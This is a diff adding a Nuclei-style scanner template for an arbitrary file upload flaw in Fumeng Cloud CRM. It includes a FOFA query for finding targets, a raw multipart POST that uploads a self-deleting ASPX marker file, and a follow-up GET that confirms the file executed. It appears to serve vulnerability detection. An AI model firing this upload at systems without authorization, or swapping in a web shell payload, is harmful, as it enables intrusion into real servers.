@@ -1,0 +1,37 @@
+id: fumeng-cloud-crm-ajaxwritemail-upload
+
+info:
+  name: 孚盟云CRM系统AjaxWriteMail.ashx组件任意文件上传漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="孚盟软件-孚盟云"
+  tags: 孚盟云CRM
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+    - |
+      POST /m/Dingding/Ajax/AjaxWriteMail.ashx?method=UpLoadAttachment HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKNt0t4vBe8cX9rZk
+
+      ------WebKitFormBoundaryKNt0t4vBe8cX9rZk
+      Content-Disposition: form-data; name="file"; filename="NTest.aspx"
+      Content-Type: text/plain
+
+      <%@ Page Language="C#"%><% Response.Write("NdayTest"); System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
+      ------WebKitFormBoundaryKNt0t4vBe8cX9rZk--
+  - raw:
+    - |
+      GET /m/Dingding/Ajax/NTest.aspx HTTP/1.1
+      Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+    - type: status
+      status: [200]
+    - type: word
+      part: body
+      words:
+      - 'NdayTest'
